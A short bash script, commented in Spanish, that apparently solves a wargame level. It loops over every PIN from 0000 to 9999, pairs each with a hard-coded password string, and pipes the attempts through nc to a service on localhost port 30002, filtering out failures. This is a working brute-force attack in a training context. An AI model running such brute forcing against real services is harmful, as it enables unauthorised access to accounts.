#!/bin/bash

#Durante cada iteración del bucle, la variable "i" tomará el valor actual del número en el rango. Por ejemplo, en la primera iteración, "i" será igual a "0000", luego en la segunda iteración "i" será igual a "0001", y así sucesivamente hasta llegar a "9999"
for pin in {0000..9999}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"; done > $1
cat $1 | nc localhost 30002 | grep -vE "Wrong|I am " 
